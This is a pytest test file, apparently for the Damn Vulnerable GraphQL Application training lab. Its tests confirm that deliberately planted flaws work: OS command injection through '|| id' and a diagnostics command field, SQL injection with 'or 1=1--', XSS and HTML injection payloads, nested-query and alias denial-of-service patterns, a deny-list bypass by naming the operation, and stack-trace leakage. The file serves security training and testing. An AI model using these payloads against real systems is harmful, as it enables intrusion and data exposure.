
import requests
import os.path

from common import graph_query, GRAPHQL_URL, GRAPHIQL_URL, URL

def test_circular_query_pastes_owners():
  query = """
    query {
       pastes {
          owner {
              pastes {
                  owner {
                      name
                  }
              }
          }
       }
    }
  """
  r = graph_query(GRAPHQL_URL, query)
  assert r.status_code == 200
  assert r.json()['data']['pastes'][0]['owner']['pastes'][0]['owner']['name'] == 'DVGAUser'

def test_aliases_overloading():
    query = """
        query {
            a1: pastes { id }
            a2: pastes { id }
            a3: pastes { id }
            a4: pastes { id }
            a5: pastes { id }
        }
    """
    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert len(r.json()['data'].keys()) == 5

def test_field_suggestions():
    query = """
        query {
            systemUpd
        }
    """
    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 400
    assert 'Did you mean' in r.json()['errors'][0]['message']

def test_os_injection():
    query = """
        mutation {
            importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || id", scheme:"http") {
                result
            }
        }
    """

    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert 'uid=' in r.json()['data']['importPaste']['result']

def test_os_injection_alt():
    query = """
        query {
            systemDiagnostics(username:"admin", password:"changeme", cmd:"id")
        }
    """

    r= graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert 'uid=' in r.json()['data']['systemDiagnostics']

def test_xss():
    query = """
        mutation {
            createPaste(title:"<script>alert(1)</script>", content:"zzzz", public:true) {
                paste {
                    title
                }
            }
        }
    """

    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert r.json()['data']['createPaste']['paste']['title'] == '<script>alert(1)</script>'

def test_log_injection():
    query = """
        query pwned {
            systemHealth
        }
    """

    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    r = requests.get(URL + '/audit')

    assert r.status_code == 200
    assert 'query pwned {' in r.text

def test_html_injection():
    query = """
        mutation {
            createPaste(title:"<h1>hello!</h1>", content:"zzzz", public:true) {
                paste {
                    title
                    content
                    public
                }
            }
        }
    """

    r = graph_query(GRAPHQL_URL, query)

    assert r.status_code == 200
    assert r.json()['data']['createPaste']['paste']['title'] == '<h1>hello!</h1>'
    assert r.json()['data']['createPaste']['paste']['content'] == 'zzzz'
    assert r.json()['data']['createPaste']['paste']['public'] == True

def test_sql_injection():
    query = """
        query {
           pastes(filter:"aaa ' or 1=1--") {
                content
                title
            }
        }
    """

    r = graph_query(GRAPHQL_URL, query)
    assert r.status_code == 200
    assert len(r.json()['data']['pastes']) > 1

def test_deny_list_expert_mode():
    query = """
        query {
            systemHealth
        }
    """
    r = graph_query(GRAPHQL_URL, query, headers={"X-DVGA-MODE":'Expert'})
    assert r.status_code == 200
    assert r.json()['errors'][0]['message'] == '400 Bad Request: Query is on the Deny List.'

def test_deny_list_expert_mode_bypass():
    query = """
        query getPastes {
            systemHealth
        }
    """
    r = graph_query(GRAPHQL_URL, query, headers={"X-DVGA-MODE":'Expert'})
    assert r.status_code == 200
    assert 'System Load' in r.json()['data']['systemHealth']
    assert '.' in r.json()['data']['systemHealth'].split('System Load: ')[1]

def test_deny_list_beginner_mode():
    query = """
        query {
            systemHealth
        }
    """
    r = graph_query(GRAPHQL_URL, query, headers={"X-DVGA-MODE":'Beginner'})
    assert r.status_code == 200
    assert 'System Load' in r.json()['data']['systemHealth']
    assert '.' in r.json()['data']['systemHealth'].split('System Load: ')[1]

def test_circular_fragments():
    assert os.path.exists('app.py')
    f = open('app.py', 'r').read()
    assert 'sys.setrecursionlimit(100000)' in f

def test_stack_trace_errors():
    query = """
        query {
            pastes {
                conteeeent
            }
        }
    """
    r = graph_query(GRAPHIQL_URL, query, headers={"X-DVGA-MODE":'Beginner'})
    assert r.status_code == 400
    assert len(r.json()['errors'][0]['extensions']['exception']['stack']) > 0
    assert r.json()['errors'][0]['extensions']['exception']['stack']
    assert 'Traceback' in r.json()['errors'][0]['extensions']['exception']['debug']
    assert r.json()['errors'][0]['extensions']['exception']['path'].endswith('.py')
